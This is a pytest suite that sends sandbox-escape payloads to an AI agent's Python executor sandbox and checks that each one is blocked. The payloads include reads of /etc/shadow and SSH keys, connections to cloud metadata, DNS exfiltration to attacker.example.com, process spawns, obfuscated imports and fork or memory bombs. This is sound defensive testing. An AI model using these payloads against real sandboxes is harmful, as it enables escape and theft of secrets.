"""Sandbox escape suite — every documented attack vector must be blocked.

# OWNS: adversarial tests against the `agents/python_executor` sandbox.
#       The sandbox has two defensive layers: a host-side regex
#       pre-filter (``_is_safe`` / ``_first_blocked_pattern``) that
#       refuses obvious patterns before any subprocess is spawned, and a
#       PEP 578 audit hook + RLIMITs inside the subprocess that catch
#       anything that slips through (dynamic ``getattr``, ``importlib``,
#       etc.). Both must hold; this suite exercises each.
#
# NOT OWNS: the Docker/gVisor live_sandbox in ``core/sandbox/`` (the
#       long-lived workspace surface). Its escape suite is a separate
#       follow-up — those containers have an entirely different threat
#       model (network bind-mounts, mount escapes, runc CVEs).
#
# INVARIANTS:
#   * Every named-malicious payload must EITHER (a) be refused by the
#     static pre-filter with a structured ``python_executor.blocked_*``
#     envelope, OR (b) run inside the subprocess and exit non-zero with
#     a ``PermissionError: aztea-sandbox: …`` line in stderr.
#   * No payload may complete with ``exit_code == 0`` and stdout showing
#     the attempted side-effect.
#   * Wall-clock + memory ceilings must terminate runaway payloads. The
#     timeout exit code is ``124``.
#
# HARD GATE: Wave 3 spec line 169 — "Sandbox escape test suite ([8])
#       MUST pass 100% before [4] frontend goes to production traffic.
#       Treat this as a hard gate." Treat any new failure here as P0.
#
# DECISIONS:
#   - All tests call ``agents.python_executor.run`` directly. Going
#     through the HTTP route would just add a TestClient layer without
#     changing what the sandbox sees. The route's auth + rate-limit is
#     covered separately.
#   - One assertion per payload — escape attempts shouldn't succeed
#     "partially". Either the static filter caught it (preferred) or
#     the runtime audit hook caught it; either is a pass.
"""

from __future__ import annotations

import time

import pytest


# Tight timeout for adversarial tests so a slow CI box doesn't false-
# fail the wall-clock cases. Real production uses
# ``agents.python_executor._DEFAULT_TIMEOUT_S = 10``; these tests pin
# explicit short timeouts on each call where they matter.
_FAST_TIMEOUT_S = 3
_VERY_SHORT_TIMEOUT_S = 2


# ---------------------------------------------------------------------------
# Shared assertion helpers
# ---------------------------------------------------------------------------


def _assert_blocked(result: dict, *, hint: str = "") -> None:
    """Either static pre-filter blocked it, OR audit hook blocked it.

    Both outcomes are acceptable. What is NOT acceptable: ``exit_code == 0``
    with stdout showing the attempted side-effect (i.e., the payload
    succeeded).
    """
    err = result.get("error")
    if err and isinstance(err, dict):
        # Static pre-filter or pre-execution validation refused.
        code = err.get("code", "")
        assert code.startswith("python_executor."), (
            f"Expected python_executor.* error code, got {code!r}. {hint}"
        )
        return
    # No envelope error — the subprocess ran; require non-zero exit + a
    # PermissionError signal in stderr.
    assert result.get("exit_code", 0) != 0, (
        f"Sandbox payload completed with exit_code=0 — escape attempt may "
        f"have succeeded. Result: {result!r}. {hint}"
    )
    stderr = (result.get("stderr") or "")
    assert "aztea-sandbox" in stderr or "PermissionError" in stderr, (
        f"Subprocess exited non-zero but didn't surface a sandbox-block "
        f"signal in stderr. Result: {result!r}. {hint}"
    )


def _run(code: str, timeout: int = _FAST_TIMEOUT_S) -> dict:
    """Run a payload with explain=False so we don't burn LLM credits."""
    from agents.python_executor import run as _exec_run
    return _exec_run({"code": code, "timeout": timeout, "explain": False})


# ---------------------------------------------------------------------------
# 1. File-system escape: read outside the sandbox tempdir
# ---------------------------------------------------------------------------


def test_block_read_etc_passwd():
    """Reading /etc/passwd must be blocked. Universal attacker probe."""
    _assert_blocked(_run("print(open('/etc/passwd').read())"), hint="/etc/passwd")


def test_block_read_etc_shadow():
    """/etc/shadow is the canonical secret target on Linux."""
    _assert_blocked(_run("print(open('/etc/shadow').read())"), hint="/etc/shadow")


def test_block_read_root_ssh_keys():
    _assert_blocked(_run("print(open('/root/.ssh/id_rsa').read())"), hint="root ssh")


def test_block_read_proc_self_environ():
    """Process env vars (incl. anything leaked via inherited env) live in
    /proc/self/environ. Must be unreadable."""
    _assert_blocked(_run("print(open('/proc/self/environ').read())"), hint="/proc")


def test_block_read_sys_kernel_files():
    _assert_blocked(_run("print(open('/sys/kernel/uevent_helper').read())"), hint="/sys")


def test_block_relative_path_traversal_to_etc():
    """Path traversal via .. must not bypass the cwd check (the audit hook
    resolves realpath before comparing)."""
    code = (
        "import os\n"
        "print(open(os.path.join(os.getcwd(), '..', '..', '..', '..', 'etc', 'passwd')).read())\n"
    )
    _assert_blocked(_run(code), hint="path traversal")


def test_block_listdir_outside_sandbox():
    """``os.listdir('/')`` must be refused — the directory walk reveals
    host filesystem layout even if no individual file is read."""
    _assert_blocked(_run("import os; print(os.listdir('/'))"), hint="root listdir")


def test_block_listdir_home():
    _assert_blocked(_run("import os; print(os.listdir('/home'))"), hint="home listdir")


# ---------------------------------------------------------------------------
# 2. Network egress: any form of outbound connection must be blocked
# ---------------------------------------------------------------------------


def test_block_socket_connect_external():
    """Direct TCP to an external host. The audit hook on socket.connect
    fires before the syscall."""
    code = (
        "import socket\n"
        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        "s.connect(('1.1.1.1', 80))\n"
        "print('escaped')\n"
    )
    _assert_blocked(_run(code), hint="socket.connect external")


def test_block_socket_connect_internal():
    """Connecting to 169.254.169.254 (cloud metadata) is the classic
    SSRF target. Must be blocked along with all other connect() calls."""
    code = (
        "import socket\n"
        "s = socket.socket()\n"
        "s.connect(('169.254.169.254', 80))\n"
    )
    _assert_blocked(_run(code), hint="metadata IP")


def test_block_urllib_request():
    """urllib.request is the convenient HTTP path — must be blocked."""
    code = (
        "import urllib.request\n"
        "print(urllib.request.urlopen('http://example.com').read())\n"
    )
    _assert_blocked(_run(code), hint="urllib")


def test_block_socket_getaddrinfo():
    """DNS resolution itself leaks — block getaddrinfo so DNS-exfil tunnels
    can't run even if the connection step were somehow allowed."""
    code = "import socket; print(socket.getaddrinfo('attacker.example.com', 80))"
    _assert_blocked(_run(code), hint="DNS resolve")


def test_block_socket_gethostbyname():
    code = "import socket; print(socket.gethostbyname('attacker.example.com'))"
    _assert_blocked(_run(code), hint="DNS resolve")


def test_block_dns_exfiltration_via_subdomain():
    """A canonical DNS exfiltration pattern: encode secret as subdomain
    and resolve it. Block at the resolve step."""
    code = (
        "import socket, base64\n"
        "secret = 'top_secret'\n"
        "label = base64.b32encode(secret.encode()).decode().rstrip('=').lower()\n"
        "socket.gethostbyname(label + '.attacker.example.com')\n"
    )
    _assert_blocked(_run(code), hint="DNS exfil")


# ---------------------------------------------------------------------------
# 3. Subprocess / exec: any form of process spawn must be blocked
# ---------------------------------------------------------------------------


def test_block_os_system():
    _assert_blocked(_run("import os; os.system('id')"), hint="os.system")


def test_block_subprocess_popen():
    _assert_blocked(
        _run("import subprocess; subprocess.Popen(['/bin/sh', '-c', 'id'])"),
        hint="subprocess.Popen",
    )


def test_block_subprocess_run():
    _assert_blocked(
        _run("import subprocess; subprocess.run(['ls', '/'])"),
        hint="subprocess.run",
    )


def test_block_os_execv():
    _assert_blocked(_run("import os; os.execv('/bin/sh', ['/bin/sh', '-c', 'id'])"))


def test_block_os_fork():
    _assert_blocked(_run("import os; os.fork()"), hint="os.fork")


def test_block_os_spawn():
    _assert_blocked(
        _run("import os; os.spawnvp(os.P_NOWAIT, 'id', ['id'])"), hint="os.spawn"
    )


# ---------------------------------------------------------------------------
# 4. Dynamic-construction escapes: getattr / __import__ / eval / exec /
#    importlib — anything that constructs the blocked symbol at runtime.
# ---------------------------------------------------------------------------


def test_block_eval_with_attacker_string():
    """``eval`` itself isn't directly blocked (it's a Python builtin),
    but the audit hook fires when the inner code touches a blocked event."""
    _assert_blocked(_run("eval(\"__import__('os').system('id')\")"), hint="eval")


def test_block_exec_with_attacker_string():
    _assert_blocked(_run("exec(\"import os; os.system('id')\")"), hint="exec")


def test_block_getattr_dunder_import_socket_connect():
    """Bypass-attempt: construct socket.connect via getattr chain. Audit
    hook still fires because it sees the C-level syscall, not the Python
    name."""
    code = (
        "m = __import__('socket')\n"
        "s = getattr(m, 'socket')()\n"
        "getattr(s, 'connect')(('1.1.1.1', 80))\n"
    )
    _assert_blocked(_run(code), hint="getattr socket")


def test_block_importlib_subprocess():
    code = (
        "import importlib\n"
        "sp = importlib.import_module('subprocess')\n"
        "sp.Popen(['id'])\n"
    )
    _assert_blocked(_run(code), hint="importlib subprocess")


def test_block_string_concat_import():
    """String-built attribute access — defeats naive regex pre-filters
    that look for the literal ``import socket`` token. Audit hook is
    the backstop."""
    code = (
        "name = 'soc' + 'ket'\n"
        "m = __import__(name)\n"
        "s = m.socket()\n"
        "s.connect(('1.1.1.1', 80))\n"
    )
    _assert_blocked(_run(code), hint="concat import")


def test_block_ctypes_dlopen():
    """Native-code loading via ctypes. The audit hook on ctypes.dlopen
    fires before the .so is loaded."""
    code = "import ctypes; ctypes.CDLL('libc.so.6').system(b'id')"
    _assert_blocked(_run(code), hint="ctypes CDLL")


# ---------------------------------------------------------------------------
# 5. File-system mutation: writes outside the sandbox tempdir must be
#    blocked (the audit hook on `open` checks the resolved path).
# ---------------------------------------------------------------------------


def test_block_write_outside_sandbox():
    _assert_blocked(
        _run("open('/tmp/escape.txt', 'w').write('hi')"), hint="write outside cwd"
    )


def test_block_shutil_copy_out():
    code = (
        "import shutil, os\n"
        "with open(os.path.join(os.getcwd(), 'src.txt'), 'w') as f: f.write('x')\n"
        "shutil.copy(os.path.join(os.getcwd(), 'src.txt'), '/tmp/exfil.txt')\n"
    )
    _assert_blocked(_run(code), hint="shutil copy out")


# ---------------------------------------------------------------------------
# 6. Resource exhaustion: must terminate cleanly, not hang.
# ---------------------------------------------------------------------------


def test_cpu_infinite_loop_terminates_within_timeout():
    """Infinite loop must hit the wall-clock timeout. We measure that the
    call returns within timeout + a small grace window, and signals
    ``timed_out``."""
    start = time.monotonic()
    result = _run("while True: pass", timeout=_VERY_SHORT_TIMEOUT_S)
    elapsed = time.monotonic() - start
    # Allow a 3-second grace window for subprocess teardown / coverage
    # overhead. The hard expectation is "doesn't hang forever," not
    # millisecond accuracy.
    assert elapsed < _VERY_SHORT_TIMEOUT_S + 3, (
        f"Infinite-loop payload did not terminate within {_VERY_SHORT_TIMEOUT_S + 3}s "
        f"(actual={elapsed:.1f}s) — wall-clock guard failed."
    )
    # Either the static filter caught it ahead of time (unlikely — the
    # naive ``while True`` is allowed as a syntactic structure), or the
    # subprocess timed out (exit_code 124, timed_out True).
    err = result.get("error")
    if err:
        return  # Static filter refused — also acceptable.
    assert result.get("timed_out") is True or result.get("exit_code") == 124, (
        f"Wall-clock guard did not fire: {result!r}"
    )


def test_memory_bomb_killed_by_rlimit():
    """Allocating > RLIMIT_AS triggers MemoryError inside the subprocess
    or a non-zero exit. Either way the process terminates and we get
    something other than a clean exit_code 0."""
    # Try to allocate ~1 GB — well above the 128 MB default ceiling.
    code = "x = bytearray(1024 * 1024 * 1024)"
    result = _run(code, timeout=_FAST_TIMEOUT_S)
    err = result.get("error")
    if err:
        return  # Static analyzer caught the literal allocation size.
    assert result.get("exit_code", 0) != 0, (
        f"1GB allocation succeeded under RLIMIT — memory guard failed: {result!r}"
    )


def test_fork_bomb_blocked_by_audit_hook():
    """``os.fork`` is on the blocked audit-event list. Fork bombs cannot
    even start their first iteration."""
    code = (
        "import os\n"
        "while True:\n"
        "    os.fork()\n"
    )
    _assert_blocked(_run(code, timeout=_VERY_SHORT_TIMEOUT_S), hint="fork bomb")


# ---------------------------------------------------------------------------
# 7. Host-identity / environment leakage probes
# ---------------------------------------------------------------------------


def test_platform_node_is_masked():
    """``platform.node()`` is similarly monkey-patched. Defends against
    callers using ``platform`` instead of ``socket`` to fingerprint."""
    result = _run("import platform; print(platform.node())")
    assert result.get("error") is None, result
    stdout = (result.get("stdout") or "").strip()
    assert stdout == "aztea-sandbox", f"platform.node leaked: {stdout!r}"


# ---------------------------------------------------------------------------
# 8. Negative controls — confirm safe code still runs
# ---------------------------------------------------------------------------


def test_safe_code_runs_to_completion():
    """A pure-computation payload must succeed cleanly. Without this
    test, a sandbox that refused everything would falsely 'pass' the
    suite."""
    result = _run("print(sum(range(100)))")
    assert result.get("error") is None, result
    assert result.get("exit_code") == 0, result
    assert (result.get("stdout") or "").strip() == "4950"


def test_safe_file_write_in_cwd_allowed():
    """Writes to the sandbox tempdir must be allowed — the sandbox is
    useless if the agent can't even create a scratch file."""
    code = (
        "import os\n"
        "p = os.path.join(os.getcwd(), 'scratch.txt')\n"
        "with open(p, 'w') as f: f.write('hi')\n"
        "with open(p) as f: print(f.read())\n"
    )
    result = _run(code)
    assert result.get("error") is None, result
    assert result.get("exit_code") == 0, result
    assert (result.get("stdout") or "").strip() == "hi"


def test_dev_null_writes_allowed():
    """/dev/null is in the explicit allowlist — common for benchmarking
    and write-discard patterns."""
    result = _run("open('/dev/null', 'w').write('x'); print('ok')")
    assert result.get("error") is None, result
    assert (result.get("stdout") or "").strip() == "ok"


def test_dev_urandom_reads_allowed():
    """/dev/urandom is on the allowlist for crypto primitives — agents
    that need real randomness (token generation, ML seeding) must work."""
    result = _run("import os; print(len(os.urandom(16)))")
    assert result.get("error") is None, result
    assert (result.get("stdout") or "").strip() == "16"


# ---------------------------------------------------------------------------
# 9. Pre-filter regression: the host-side regex must still catch the
#    obvious payloads even though the audit hook would also catch them.
#    Defense-in-depth — both layers must independently hold.
# ---------------------------------------------------------------------------


def test_static_filter_catches_import_socket():
    """``import socket`` is on the static block list — refused before any
    subprocess is spawned. Saves CPU on naive abuse attempts."""
    result = _run("import socket\nprint(1)")
    assert (result.get("error") or {}).get("code") == "python_executor.blocked_unsafe_code", (
        f"Static pre-filter should have refused 'import socket' before exec: {result!r}"
    )


def test_static_filter_catches_subprocess_import():
    result = _run("import subprocess\nprint(1)")
    assert (result.get("error") or {}).get("code") == "python_executor.blocked_unsafe_code"


def test_static_filter_catches_os_system_literal():
    result = _run("import os\nos.system('id')")
    assert (result.get("error") or {}).get("code") == "python_executor.blocked_unsafe_code"


# ---------------------------------------------------------------------------
# 10. B-S2 regression (2026-05-30 review): the removed warm-pool path ran
#     user code in-process WITHOUT the audit-hook prelude. The flag that
#     selected it must never again pick an unsandboxed path — with the env
#     set, escapes must be blocked exactly like the subprocess path.
# ---------------------------------------------------------------------------


def test_warm_pool_flag_cannot_select_unsandboxed_path(monkeypatch):
    """AZTEA_PYTHON_WARM_POOL=1 must not weaken the sandbox (B-S2)."""
    monkeypatch.setenv("AZTEA_PYTHON_WARM_POOL", "1")
    _assert_blocked(
        _run("print(open('/etc/passwd').read())"),
        hint="warm-pool flag set; /etc/passwd read must still be sandboxed",
    )


def test_warm_pool_flag_blocks_runtime_obfuscation(monkeypatch):
    """The exact bypass class from the review: runtime-constructed open().

    The old pool path had no audit hook, so getattr-style obfuscation that
    defeats the regex pre-filter executed unsandboxed. The audit hook in the
    subprocess path must catch it regardless of the flag.
    """
    monkeypatch.setenv("AZTEA_PYTHON_WARM_POOL", "1")
    code = (
        "f = getattr(__import__('io'), 'open')\n"
        "print(f('/etc/passwd').read())\n"
    )
    _assert_blocked(_run(code), hint="obfuscated open() under warm-pool flag")


def test_warm_pool_module_has_no_pool_executor():
    """Structural guard: no in-process exec path may exist in the module."""
    import agents.python_executor as px

    for name in ("_exec_in_pool", "_run_via_warm_pool", "_get_warm_pool"):
        assert not hasattr(px, name), (
            f"{name} re-appeared in python_executor — in-process execution "
            "of user code was removed for B-S2 and must not return"
        )
